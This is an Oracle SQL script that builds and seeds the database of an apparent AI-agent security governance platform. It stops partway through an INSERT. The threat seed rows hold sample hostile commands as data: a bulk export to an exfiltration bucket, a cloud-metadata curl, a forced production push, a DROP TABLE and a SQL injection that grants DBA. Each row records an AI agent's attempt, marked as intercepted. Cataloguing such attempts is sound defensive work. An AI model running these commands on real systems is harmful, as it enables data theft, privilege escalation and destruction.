-- =====================================================================
-- NexusGuard Core Governance & Security Architecture for Oracle 11g
-- Creates all 15 tables and seeds the 5 Sovereign Autonomous Agents
-- =====================================================================

SET DEFINE OFF;
WHENEVER SQLERROR CONTINUE;

-- Drop existing tables in reverse dependency order
DROP TABLE audit_logs CASCADE CONSTRAINTS;
DROP TABLE agent_executions CASCADE CONSTRAINTS;
DROP TABLE agent_communications CASCADE CONSTRAINTS;
DROP TABLE agent_trust_history CASCADE CONSTRAINTS;
DROP TABLE agent_trust CASCADE CONSTRAINTS;
DROP TABLE approval_signatures CASCADE CONSTRAINTS;
DROP TABLE approval_requests CASCADE CONSTRAINTS;
DROP TABLE risk_assessments CASCADE CONSTRAINTS;
DROP TABLE threats CASCADE CONSTRAINTS;
DROP TABLE policies CASCADE CONSTRAINTS;
DROP TABLE agent_permissions CASCADE CONSTRAINTS;
DROP TABLE permissions CASCADE CONSTRAINTS;
DROP TABLE agent_credentials CASCADE CONSTRAINTS;
DROP TABLE agents CASCADE CONSTRAINTS;
DROP TABLE users CASCADE CONSTRAINTS;

WHENEVER SQLERROR EXIT FAILURE;

-- 1. users
CREATE TABLE users (
    id VARCHAR2(64) PRIMARY KEY,
    email VARCHAR2(255) NOT NULL UNIQUE,
    username VARCHAR2(64) NOT NULL UNIQUE,
    full_name VARCHAR2(128) NOT NULL,
    hashed_password VARCHAR2(255) NOT NULL,
    role VARCHAR2(64) DEFAULT 'REVIEWER' NOT NULL,
    avatar_initials VARCHAR2(8),
    is_active NUMBER(1) DEFAULT 1 NOT NULL,
    is_superuser NUMBER(1) DEFAULT 0 NOT NULL,
    fido2_token_hash VARCHAR2(255),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 2. agents
CREATE TABLE agents (
    id VARCHAR2(64) PRIMARY KEY,
    name VARCHAR2(128) NOT NULL,
    model VARCHAR2(64) NOT NULL,
    owner VARCHAR2(128) NOT NULL,
    role VARCHAR2(128) NOT NULL,
    "cluster" VARCHAR2(128) DEFAULT 'Cluster-Default' NOT NULL,
    status VARCHAR2(32) DEFAULT 'active' NOT NULL,
    risk_tier VARCHAR2(32) DEFAULT 'LOW' NOT NULL,
    description CLOB,
    last_action VARCHAR2(255),
    last_seen VARCHAR2(128),
    violations_count NUMBER DEFAULT 0 NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 3. agent_credentials
CREATE TABLE agent_credentials (
    id VARCHAR2(64) PRIMARY KEY,
    agent_id VARCHAR2(64) NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
    key_type VARCHAR2(64) DEFAULT 'mTLS-Ed25519' NOT NULL,
    public_key_fingerprint VARCHAR2(128) NOT NULL UNIQUE,
    pcr0_measurement VARCHAR2(128),
    issued_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    expires_at TIMESTAMP WITH TIME ZONE,
    is_revoked NUMBER(1) DEFAULT 0 NOT NULL,
    revoked_at TIMESTAMP WITH TIME ZONE,
    revocation_reason VARCHAR2(255),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 4. permissions
CREATE TABLE permissions (
    id VARCHAR2(64) PRIMARY KEY,
    scope_name VARCHAR2(128) NOT NULL UNIQUE,
    "resource" VARCHAR2(128) NOT NULL,
    description CLOB,
    is_system NUMBER(1) DEFAULT 1 NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 5. agent_permissions
CREATE TABLE agent_permissions (
    id VARCHAR2(64) PRIMARY KEY,
    agent_id VARCHAR2(64) NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
    permission_id VARCHAR2(64) NOT NULL REFERENCES permissions(id) ON DELETE CASCADE,
    granted_by VARCHAR2(64),
    granted_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    is_active NUMBER(1) DEFAULT 1 NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    CONSTRAINT uq_agent_permission UNIQUE (agent_id, permission_id)
);

-- 6. policies
CREATE TABLE policies (
    id VARCHAR2(64) PRIMARY KEY,
    policy_code VARCHAR2(64) NOT NULL UNIQUE,
    name VARCHAR2(128) NOT NULL,
    description CLOB,
    framework VARCHAR2(64) DEFAULT 'NIST-AI-RMF' NOT NULL,
    standard_reference VARCHAR2(64),
    enforcement_mode VARCHAR2(32) DEFAULT 'BLOCK' NOT NULL,
    rule_expression CLOB,
    is_active NUMBER(1) DEFAULT 1 NOT NULL,
    severity VARCHAR2(32) DEFAULT 'HIGH' NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 7. threats
CREATE TABLE threats (
    id VARCHAR2(64) PRIMARY KEY,
    agent_id VARCHAR2(64) REFERENCES agents(id) ON DELETE SET NULL,
    policy_id VARCHAR2(64) REFERENCES policies(id) ON DELETE SET NULL,
    taxonomy_code VARCHAR2(32) NOT NULL,
    taxonomy_name VARCHAR2(128) NOT NULL,
    title VARCHAR2(255) NOT NULL,
    severity VARCHAR2(32) NOT NULL,
    risk_score NUMBER DEFAULT 50 NOT NULL,
    status VARCHAR2(32) DEFAULT 'CONTAINED' NOT NULL,
    engine VARCHAR2(64) DEFAULT 'eBPF + Semantic' NOT NULL,
    ingress_hash VARCHAR2(128),
    payload_summary CLOB,
    kill_chain_steps_json CLOB,
    detected_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 8. risk_assessments
CREATE TABLE risk_assessments (
    id VARCHAR2(64) PRIMARY KEY,
    agent_id VARCHAR2(64) NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
    overall_risk_score NUMBER NOT NULL,
    risk_tier VARCHAR2(32) DEFAULT 'LOW' NOT NULL,
    behavioral_drift NUMBER DEFAULT 0.0 NOT NULL,
    permission_entropy NUMBER DEFAULT 0.0 NOT NULL,
    policy_compliance_subscore NUMBER DEFAULT 100.0 NOT NULL,
    identity_attestation_subscore NUMBER DEFAULT 100.0 NOT NULL,
    heuristic_velocity_subscore NUMBER DEFAULT 100.0 NOT NULL,
    tool_egress_subscore NUMBER DEFAULT 100.0 NOT NULL,
    assessment_notes CLOB,
    assessed_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 9. approval_requests
CREATE TABLE approval_requests (
    id VARCHAR2(64) PRIMARY KEY,
    incident_code VARCHAR2(64) NOT NULL UNIQUE,
    agent_id VARCHAR2(64) NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
    policy_id VARCHAR2(64) REFERENCES policies(id) ON DELETE SET NULL,
    summary VARCHAR2(255) NOT NULL,
    target_resource VARCHAR2(255) NOT NULL,
    urgency VARCHAR2(32) DEFAULT 'routine' NOT NULL,
    status VARCHAR2(32) DEFAULT 'PENDING' NOT NULL,
    risk_score NUMBER DEFAULT 50 NOT NULL,
    initial_sla_seconds NUMBER DEFAULT 600 NOT NULL,
    remaining_sla_seconds NUMBER DEFAULT 600 NOT NULL,
    stated_objective CLOB,
    neural_analysis CLOB,
    records_affected VARCHAR2(64),
    quorum_threshold NUMBER DEFAULT 2 NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 10. approval_signatures
CREATE TABLE approval_signatures (
    id VARCHAR2(64) PRIMARY KEY,
    approval_request_id VARCHAR2(64) NOT NULL REFERENCES approval_requests(id) ON DELETE CASCADE,
    reviewer_id VARCHAR2(64) NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    is_signed NUMBER(1) DEFAULT 0 NOT NULL,
    signed_at TIMESTAMP WITH TIME ZONE,
    ephemeral_lease_ttl_minutes NUMBER,
    "comments" CLOB,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    CONSTRAINT uq_request_reviewer UNIQUE (approval_request_id, reviewer_id)
);

-- 11. agent_trust
CREATE TABLE agent_trust (
    id VARCHAR2(64) PRIMARY KEY,
    agent_id VARCHAR2(64) NOT NULL UNIQUE REFERENCES agents(id) ON DELETE CASCADE,
    current_score NUMBER DEFAULT 100.0 NOT NULL,
    baseline_score NUMBER DEFAULT 100.0 NOT NULL,
    compliance_rate NUMBER DEFAULT 100.0 NOT NULL,
    anomaly_delta NUMBER DEFAULT 0.0 NOT NULL,
    behavioral_state VARCHAR2(64) DEFAULT 'OPTIMAL (Stable)' NOT NULL,
    sigmoid_steepness NUMBER DEFAULT 1.0 NOT NULL,
    decay_half_life_hours NUMBER DEFAULT 24.0 NOT NULL,
    last_evaluated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 12. agent_trust_history
CREATE TABLE agent_trust_history (
    id VARCHAR2(64) PRIMARY KEY,
    agent_id VARCHAR2(64) NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
    trust_score NUMBER NOT NULL,
    score_delta NUMBER DEFAULT 0.0 NOT NULL,
    reason VARCHAR2(255),
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 13. agent_communications
CREATE TABLE agent_communications (
    id VARCHAR2(64) PRIMARY KEY,
    source_agent_id VARCHAR2(64) NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
    target_agent_id VARCHAR2(64) NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
    channel_title VARCHAR2(128) NOT NULL,
    protocol VARCHAR2(64) DEFAULT 'mTLS-Ed25519' NOT NULL,
    state VARCHAR2(32) DEFAULT 'verified' NOT NULL,
    channel_crypto VARCHAR2(64) DEFAULT 'mTLS v1.3 Ed25519' NOT NULL,
    signature_hash VARCHAR2(128),
    synthesized_intent CLOB,
    policy_code VARCHAR2(64),
    risk_score NUMBER DEFAULT 0 NOT NULL,
    diff_payload CLOB,
    is_severed NUMBER(1) DEFAULT 0 NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 14. agent_executions
CREATE TABLE agent_executions (
    id VARCHAR2(64) PRIMARY KEY,
    agent_id VARCHAR2(64) NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
    operation VARCHAR2(64) NOT NULL,
    target_resource VARCHAR2(255) NOT NULL,
    raw_payload_snippet CLOB,
    payload_sha256 VARCHAR2(128),
    synthesized_intent CLOB,
    verdict VARCHAR2(32) DEFAULT 'ALLOWED' NOT NULL,
    latency_ms NUMBER DEFAULT 1.5 NOT NULL,
    executed_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- 15. audit_logs
CREATE TABLE audit_logs (
    id VARCHAR2(64) PRIMARY KEY,
    tx_hash VARCHAR2(128) NOT NULL UNIQUE,
    block_number NUMBER NOT NULL,
    leaf_index VARCHAR2(64),
    leaf_hash VARCHAR2(128),
    parent_root VARCHAR2(128),
    agent_id VARCHAR2(64) REFERENCES agents(id) ON DELETE SET NULL,
    user_id VARCHAR2(64) REFERENCES users(id) ON DELETE SET NULL,
    action_type VARCHAR2(128) NOT NULL,
    target_resource VARCHAR2(255) NOT NULL,
    synthesized_intent CLOB,
    risk_score NUMBER DEFAULT 0 NOT NULL,
    applied_policy VARCHAR2(128),
    decision VARCHAR2(32) DEFAULT 'ALLOWED' NOT NULL,
    enclave_type VARCHAR2(128) DEFAULT 'AWS Nitro Enclave v2' NOT NULL,
    pcr0_measurement VARCHAR2(128),
    call_stack_json CLOB,
    event_timestamp TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL
);

-- =====================================================================
-- SEED DATA: 5 Core Sovereign Autonomous Agents (Configuration Only)
-- =====================================================================

INSERT INTO agents (id, name, model, owner, role, "cluster", status, risk_tier, description, violations_count)
VALUES (
    'agent-research-01',
    'Research Agent',
    'gemini-1.5-pro',
    'Autonomous R&D SecOps',
    'Information Discovery & Academic Intelligence',
    'Cluster-Alpha',
    'active',
    'LOW',
    'Autonomous search, literature synthesis, and documentation crawler.',
    0
);

INSERT INTO agents (id, name, model, owner, role, "cluster", status, risk_tier, description, violations_count)
VALUES (
    'agent-finance-01',
    'Finance Agent',
    'gpt-4o',
    'Treasury Systems',
    'Automated Ledger Reconciliation & Budgeting',
    'Cluster-Finance',
    'active',
    'MEDIUM',
    'Autonomous financial transaction analyst and treasury ledger gateway.',
    0
);

INSERT INTO agents (id, name, model, owner, role, "cluster", status, risk_tier, description, violations_count)
VALUES (
    'agent-coding-01',
    'Coding Agent',
    'claude-3-5-sonnet',
    'DevOps & Core Engineering',
    'Autonomous Software Synthesis & CI/CD Operator',
    'Cluster-Alpha',
    'active',
    'MEDIUM',
    'Automated code synthesis, pull request review, and repository patch engine.',
    0
);

INSERT INTO agents (id, name, model, owner, role, "cluster", status, risk_tier, description, violations_count)
VALUES (
    'agent-database-01',
    'Database Agent',
    'gpt-4o',
    'Data Infrastructure Team',
    'Schema Migration & DDL Execution Coordinator',
    'Cluster-Data',
    'active',
    'HIGH',
    'Autonomous database schema management, query optimization, and read replica manager.',
    0
);

INSERT INTO agents (id, name, model, owner, role, "cluster", status, risk_tier, description, violations_count)
VALUES (
    'agent-redagent-01',
    'RedAgent',
    'adversarial-probe-v1',
    'Red Team & Adversarial Simulation',
    'Automated Adversarial Penetration & Threat Emulation',
    'Cluster-Isolated',
    'quarantined',
    'CRITICAL',
    'Adversarial probe agent used for stress-testing NexusGuard intent verification invariants.',
    0
);





-- 1. USERS
DELETE FROM users;
INSERT INTO users (id, email, username, full_name, hashed_password, role, avatar_initials, is_active, is_superuser, fido2_token_hash)
VALUES ('user-mvance-01', 'marcus.vance@nexusguard.sec', 'mvance', 'Col. Marcus Vance', '$2b$12$eX9K0192jK...hash', 'CHIEF_SECURITY_OFFICER', 'MV', 1, 1, 'fido2-yubikey-pcr0-0192a');

INSERT INTO users (id, email, username, full_name, hashed_password, role, avatar_initials, is_active, is_superuser, fido2_token_hash)
VALUES ('user-anand-01', 'anand@nexusguard.sec', 'anand', 'Anand Patekhede', '$2b$12$kJ8921klsm...hash', 'LEAD_DEVSECOPS_ARCHITECT', 'AP', 1, 1, 'fido2-yubikey-pcr0-0821b');

INSERT INTO users (id, email, username, full_name, hashed_password, role, avatar_initials, is_active, is_superuser, fido2_token_hash)
VALUES ('user-srev-02', 'secops.reviewer@nexusguard.sec', 'sreviewer', 'Sarah Chen', '$2b$12$pP91023jjk...hash', 'SECURITY_REVIEWER', 'SC', 1, 0, 'fido2-yubikey-pcr0-0391c');

-- 2. AGENT_CREDENTIALS
DELETE FROM agent_credentials;
INSERT INTO agent_credentials (id, agent_id, key_type, public_key_fingerprint, pcr0_measurement, is_revoked)
VALUES ('cred-db-01', 'agent-database-01', 'mTLS-Ed25519', 'SHA256:4a8b1c9d8e7f6a5b4c3d2e1f0a9b8c7d', 'nitro-pcr0-8910248aef01', 0);

INSERT INTO agent_credentials (id, agent_id, key_type, public_key_fingerprint, pcr0_measurement, is_revoked)
VALUES ('cred-fin-01', 'agent-finance-01', 'mTLS-Ed25519', 'SHA256:7b9c2d1e0f8a7b6c5d4e3f2a1b0c9d8e', 'nitro-pcr0-3847291bfc02', 0);

INSERT INTO agent_credentials (id, agent_id, key_type, public_key_fingerprint, pcr0_measurement, is_revoked)
VALUES ('cred-cod-01', 'agent-coding-01', 'mTLS-Ed25519', 'SHA256:9c1d3e2f1a0b9c8d7e6f5a4b3c2d1e0f', 'nitro-pcr0-9102384aed03', 0);

INSERT INTO agent_credentials (id, agent_id, key_type, public_key_fingerprint, pcr0_measurement, is_revoked)
VALUES ('cred-res-01', 'agent-research-01', 'mTLS-Ed25519', 'SHA256:1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a', 'nitro-pcr0-1928374aee04', 0);

INSERT INTO agent_credentials (id, agent_id, key_type, public_key_fingerprint, pcr0_measurement, is_revoked, revocation_reason)
VALUES ('cred-red-01', 'agent-redagent-01', 'Adversarial-Probe', 'SHA256:00000000000000000000000000000000', 'nitro-pcr0-quarantine-probe', 1, 'Perpetual isolation due to adversarial threat simulation profile');

-- 3. PERMISSIONS
DELETE FROM permissions;
INSERT INTO permissions (id, scope_name, "resource", description, is_system)
VALUES ('perm-query-db', 'QUERY: DB', 'Oracle::ORCL.*', 'Allows read-only SQL queries (SELECT) against sovereign database schemas.', 1);

INSERT INTO permissions (id, scope_name, "resource", description, is_system)
VALUES ('perm-write-db', 'WRITE: DB', 'Oracle::ORCL.*', 'Allows database modifications (INSERT, UPDATE, DELETE) under transactional locks.', 1);

INSERT INTO permissions (id, scope_name, "resource", description, is_system)
VALUES ('perm-maint-db', 'DB: Maintenance', 'Oracle::ORCL.Maintenance', 'Allows schema indexes, vacuuming, and stats gathering.', 1);

INSERT INTO permissions (id, scope_name, "resource", description, is_system)
VALUES ('perm-read-fin', 'READ: Finance', 'Treasury::Ledgers.*', 'Allows read access to general ledger and transaction reconciliation queues.', 1);

INSERT INTO permissions (id, scope_name, "resource", description, is_system)
VALUES ('perm-write-fin', 'WRITE: Finance', 'Treasury::Transactions', 'Allows ledger journal voucher postings.', 1);

INSERT INTO permissions (id, scope_name, "resource", description, is_system)
VALUES ('perm-exec-ci', 'EXECUTE: CI', 'K8s::Cluster-Alpha.CI', 'Allows triggering automated build pipelines and test containers.', 1);

INSERT INTO permissions (id, scope_name, "resource", description, is_system)
VALUES ('perm-git-push', 'GIT: Push', 'Git::NexusGuard/Core', 'Allows committing and pushing changes to staging branches.', 1);

INSERT INTO permissions (id, scope_name, "resource", description, is_system)
VALUES ('perm-search-vec', 'SEARCH: Vector', 'VectorDB::Pinecone.Arxiv', 'Allows similarity search against vectorized academic knowledge graph.', 1);

INSERT INTO permissions (id, scope_name, "resource", description, is_system)
VALUES ('perm-read-arxiv', 'READ: Arxiv', 'Arxiv::API.Papers', 'Allows indexing open-access academic publications.', 1);

INSERT INTO permissions (id, scope_name, "resource", description, is_system)
VALUES ('perm-deploy-prod', 'DEPLOY: Prod', 'K8s::Production.Deploy', 'Production releases. Requires dual-key cryptographic quorum.', 1);

INSERT INTO permissions (id, scope_name, "resource", description, is_system)
VALUES ('perm-export-data', 'EXPORT: Data', 'Storage::Egress.DLP', 'Mass external data egress. Blocked by default under DLP invariants.', 1);

-- 4. AGENT_PERMISSIONS
DELETE FROM agent_permissions;
INSERT INTO agent_permissions (id, agent_id, permission_id, granted_by, is_active)
VALUES ('ap-db-01', 'agent-database-01', 'perm-query-db', 'user-mvance-01', 1);
INSERT INTO agent_permissions (id, agent_id, permission_id, granted_by, is_active)
VALUES ('ap-db-02', 'agent-database-01', 'perm-write-db', 'user-mvance-01', 1);
INSERT INTO agent_permissions (id, agent_id, permission_id, granted_by, is_active)
VALUES ('ap-db-03', 'agent-database-01', 'perm-maint-db', 'user-mvance-01', 1);

INSERT INTO agent_permissions (id, agent_id, permission_id, granted_by, is_active)
VALUES ('ap-fin-01', 'agent-finance-01', 'perm-read-fin', 'user-mvance-01', 1);
INSERT INTO agent_permissions (id, agent_id, permission_id, granted_by, is_active)
VALUES ('ap-fin-02', 'agent-finance-01', 'perm-query-db', 'user-mvance-01', 1);

INSERT INTO agent_permissions (id, agent_id, permission_id, granted_by, is_active)
VALUES ('ap-cod-01', 'agent-coding-01', 'perm-exec-ci', 'user-mvance-01', 1);
INSERT INTO agent_permissions (id, agent_id, permission_id, granted_by, is_active)
VALUES ('ap-cod-02', 'agent-coding-01', 'perm-git-push', 'user-mvance-01', 1);

INSERT INTO agent_permissions (id, agent_id, permission_id, granted_by, is_active)
VALUES ('ap-res-01', 'agent-research-01', 'perm-search-vec', 'user-mvance-01', 1);
INSERT INTO agent_permissions (id, agent_id, permission_id, granted_by, is_active)
VALUES ('ap-res-02', 'agent-research-01', 'perm-read-arxiv', 'user-mvance-01', 1);

-- 5. POLICIES
DELETE FROM policies;
INSERT INTO policies (id, policy_code, name, description, framework, standard_reference, enforcement_mode, severity, is_active)
VALUES ('pol-mut-001', 'POLICY-SEC-MUTATION-001', 'Zero-Mutation Strict DDL Guardrail', 'Prevents unilateral DROP TABLE, TRUNCATE, or schema destruction by autonomous agents.', 'NIST-AI-RMF', 'GOVERN 1.2', 'BLOCK', 'CRITICAL', 1);

INSERT INTO policies (id, policy_code, name, description, framework, standard_reference, enforcement_mode, severity, is_active)
VALUES ('pol-zt-002', 'POLICY-ZERO-TRUST-WRITE-002', 'Two-Tier Database Capability Interlock', 'Enforces dual capability check: requiring WRITE: DB in addition to QUERY: DB for relational mutations.', 'ISO-42001', 'Clause 9.2', 'BLOCK', 'HIGH', 1);

INSERT INTO policies (id, policy_code, name, description, framework, standard_reference, enforcement_mode, severity, is_active)
VALUES ('pol-exfil-001', 'POLICY-FIN-EXFIL-001', 'Financial Data Loss Prevention (DLP)', 'Halts unauthorized mass export or bucket egress of financial records at Stage-Zero.', 'SOC2', 'CC6.1', 'BLOCK', 'CRITICAL', 1);

INSERT INTO policies (id, policy_code, name, description, framework, standard_reference, enforcement_mode, severity, is_active)
VALUES ('pol-prod-001', 'POLICY-COD-PROD-001', 'Dual-Key Production Release Quorum', 'Requires cryptographic multi-signature approval from at least 2 humans before production deployments.', 'NIST-AI-RMF', 'MANAGE 2.4', 'BLOCK', 'HIGH', 1);

INSERT INTO policies (id, policy_code, name, description, framework, standard_reference, enforcement_mode, severity, is_active)
VALUES ('pol-meta-001', 'POLICY-RES-METADATA-001', 'Kernel Egress Metadata Trap', 'Intercepts SSRF calls to AWS EC2/Nitro metadata endpoints (169.254.169.254).', 'FIPS-140-3', 'Section 4', 'BLOCK', 'HIGH', 1);

INSERT INTO policies (id, policy_code, name, description, framework, standard_reference, enforcement_mode, severity, is_active)
VALUES ('pol-adv-001', 'POLICY-ADVERSARIAL-ISOLATION', 'Red Team Adversarial Quarantine Invariant', 'Automatically dumps and isolates adversarial probe queries with immediate session kill.', 'MITRE-ATLAS', 'AML.T0054', 'QUARANTINE', 'CRITICAL', 1);

-- 6. THREATS
DELETE FROM threats;
INSERT INTO threats (id, agent_id, policy_id, taxonomy_code, taxonomy_name, title, severity, risk_score, status, engine, payload_summary)
VALUES ('threat-01', 'agent-database-01', 'pol-mut-001', 'CWE-89', 'Destructive SQL DDL', 'Attempted DROP TABLE on sovereign agents table', 'CRITICAL', 95, 'INTERCEPTED', 'AST Intent Firewall', 'DROP TABLE agents CASCADE CONSTRAINTS');

INSERT INTO threats (id, agent_id, policy_id, taxonomy_code, taxonomy_name, title, severity, risk_score, status, engine, payload_summary)
VALUES ('threat-02', 'agent-finance-01', 'pol-exfil-001', 'OWASP-LLM-02', 'Sensitive Data Exfiltration', 'Bulk treasury ledger dump to external unauthenticated S3 bucket', 'CRITICAL', 91, 'INTERCEPTED', 'eBPF DLP Gate', 'EXPORT TABLE treasury_reserves TO s3://untrusted-exfil/');

INSERT INTO threats (id, agent_id, policy_id, taxonomy_code, taxonomy_name, title, severity, risk_score, status, engine, payload_summary)
VALUES ('threat-03', 'agent-coding-01', 'pol-prod-001', 'OWASP-LLM-07', 'Unauthorized Privilege Escalation', 'Direct production bypass git push without 2-man quorum', 'HIGH', 94, 'INTERCEPTED', 'Policy Engine', 'git push origin main --force && deploy prod');

INSERT INTO threats (id, agent_id, policy_id, taxonomy_code, taxonomy_name, title, severity, risk_score, status, engine, payload_summary)
VALUES ('threat-04', 'agent-research-01', 'pol-meta-001', 'CWE-918', 'Server-Side Request Forgery', 'Cloud metadata scraping attempt against Nitro Enclave identity', 'HIGH', 88, 'INTERCEPTED', 'eBPF Kernel Trap', 'curl -s http://169.254.169.254/latest/meta-data/');

INSERT INTO threats (id, agent_id, policy_id, taxonomy_code, taxonomy_name, title, severity, risk_score, status, engine, payload_summary)
VALUES ('threat-05', 'agent-redagent-01', 'pol-adv-001', 'OWASP-LLM-01', 'Adversarial Prompt & SQL Injection', 'Adversarial sleep lock injection and DBA role acquisition attempt', 'CRITICAL', 99, 'QUARANTINED', 'Semantic Guardrail + AST', '; EXEC dbms_lock.sleep(10); GRANT DBA TO RED_AGENT; --');

-- 7. RISK_ASSESSMENTS
DELETE FROM risk_assessments;
INSERT INTO risk_assessments (id, agent_id, overall_risk_score, risk_tier, behavioral_drift, permission_entropy, policy_compliance_subscore, identity_attestation_subscore, heuristic_velocity_subscore, tool_egress_subscore, assessment_notes)
VALUES ('risk-db-01', 'agent-database-01', 14, 'LOW', 0.02, 0.08, 98.5, 99.0, 95.0, 94.0, 'Optimal database operations baseline. Zero unauthorized mutations committed.');

INSERT INTO risk_assessments (id, agent_id, overall_risk_score, risk_tier, behavioral_drift, permission_entropy, policy_compliance_subscore, identity_attestation_subscore, heuristic_velocity_subscore, tool_egress_subscore, assessment_notes)
VALUES ('risk-fin-01', 'agent-finance-01', 22, 'LOW', 0.05, 0.12, 94.0, 98.0, 92.0, 89.0, 'Treasury queries operating within normal financial envelope. Exfiltration trapped.');

INSERT INTO risk_assessments (id, agent_id, overall_risk_score, risk_tier, behavioral_drift, permission_entropy, policy_compliance_subscore, identity_attestation_subscore, heuristic_velocity_subscore, tool_egress_subscore, assessment_notes)
VALUES ('risk-cod-01', 'agent-coding-01', 19, 'LOW', 0.03, 0.10, 96.0, 97.0, 93.0, 91.0, 'CI/CD pipeline operations normal. Production branch gating active.');

INSERT INTO risk_assessments (id, agent_id, overall_risk_score, risk_tier, behavioral_drift, permission_entropy, policy_compliance_subscore, identity_attestation_subscore, heuristic_velocity_subscore, tool_egress_subscore, assessment_notes)
VALUES ('risk-res-01', 'agent-research-01', 12, 'LOW', 0.01, 0.05, 99.0, 99.5, 97.0, 96.0, 'Academic research discovery within rate limits. Metadata calls intercepted.');

INSERT INTO risk_assessments (id, agent_id, overall_risk_score, risk_tier, behavioral_drift, permission_entropy, policy_compliance_subscore, identity_attestation_subscore, heuristic_velocity_subscore, tool_egress_subscore, assessment_notes)
VALUES ('risk-red-01', 'agent-redagent-01', 98, 'CRITICAL', 0.94, 0.88, 12.0, 20.0, 15.0, 10.0, 'Adversarial probe. All capabilities revoked. Contained in isolated sandbox enclave.');

-- 8. APPROVAL_REQUESTS
DELETE FROM approval_requests;
INSERT INTO approval_requests (id, incident_code, agent_id, policy_id, summary, target_resource, urgency, status, risk_score, stated_objective, neural_analysis, records_affected, quorum_threshold)
VALUES ('appr-01', 'REQ-2026-1049', 'agent-database-01', 'pol-zt-002', 'High-impact schema index creation on user_accounts table', 'Oracle::ORCL.user_accounts', 'urgent', 'PENDING', 76, 'Create bitmap index on user_accounts(created_at, status) to optimize quarterly audit query latency.', 'Neural intent synthesis confirms performance intent. No destructive schema deletion identified.', '1,420,000 records', 2);

INSERT INTO approval_requests (id, incident_code, agent_id, policy_id, summary, target_resource, urgency, status, risk_score, stated_objective, neural_analysis, records_affected, quorum_threshold)
VALUES ('appr-02', 'REQ-2026-1050', 'agent-coding-01', 'pol-prod-001', 'Production release deployment for v2.4.0 hotfix', 'K8s::Production.Cluster', 'routine', 'PENDING', 68, 'Deploy verified CVE-2026-0812 patch container to production Kubernetes worker nodes.', 'Container cryptographic SHA digest matches signed staging release manifest.', 'Cluster-wide', 2);

INSERT INTO approval_requests (id, incident_code, agent_id, policy_id, summary, target_resource, urgency, status, risk_score, stated_objective, neural_analysis, records_affected, quorum_threshold)
